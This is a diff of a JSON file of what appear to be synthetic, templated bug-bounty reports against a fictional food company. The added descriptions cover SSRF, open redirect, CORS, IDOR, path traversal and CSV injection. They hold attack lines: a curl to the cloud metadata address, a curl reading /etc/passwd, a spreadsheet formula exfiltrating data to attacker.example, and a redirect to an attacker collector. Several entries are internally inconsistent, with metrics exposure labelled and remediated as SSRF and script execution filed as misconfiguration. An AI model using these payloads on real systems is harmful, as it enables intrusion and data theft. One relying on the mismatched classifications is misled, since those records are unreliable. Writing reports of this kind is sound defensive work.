+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18476,7 +18616,8 @@
           "offset": "3d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.laerchenquell-foods.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18604,7 +18745,8 @@
           "offset": "8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18763,7 +18905,8 @@
           "offset": "8d 8h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.laerchenquell-foods.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18878,7 +19021,8 @@
           "offset": "3d 21h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.laerchenquell-foods.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19038,7 +19182,8 @@
           "offset": "8d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19142,7 +19287,8 @@
           "offset": "3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://erp.laerchenquell-foods.foo/import`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19289,7 +19435,8 @@
           "offset": "3d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19443,7 +19590,8 @@
           "offset": "8d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19557,7 +19705,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://erp.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19644,7 +19793,8 @@
           "offset": "1d 1h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -19760,7 +19910,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://erp.laerchenquell-foods.foo/export`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19904,7 +20055,8 @@
           "offset": "1d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20007,7 +20159,8 @@
           "offset": "5d",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://erp.laerchenquell-foods.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20135,7 +20288,8 @@
           "offset": "23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://erp.laerchenquell-foods.foo/api/me`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20275,7 +20429,8 @@
           "offset": "4d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20447,7 +20602,8 @@
           "offset": "7d 22h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://erp.laerchenquell-foods.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20579,7 +20735,8 @@
           "offset": "9d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://erp.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20706,7 +20863,8 @@
           "offset": "7d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://erp.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20806,7 +20964,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20897,7 +21056,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/api/import`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21008,7 +21168,8 @@
           "offset": "3d 14h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21140,7 +21301,8 @@
           "offset": "1d 19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://erp.laerchenquell-foods.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21271,7 +21433,8 @@
           "offset": "1d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21395,7 +21558,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://erp.laerchenquell-foods.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21551,7 +21715,8 @@
           "offset": "3d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21685,7 +21850,8 @@
           "offset": "8d 1h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21801,7 +21967,8 @@
           "offset": "6d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21915,7 +22082,8 @@
           "offset": "5d 22h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://erp.laerchenquell-foods.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -22041,7 +22209,8 @@
           "offset": "1d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://erp.laerchenquell-foods.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22129,7 +22298,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://erp.laerchenquell-foods.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22228,7 +22398,8 @@
           "offset": "3d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
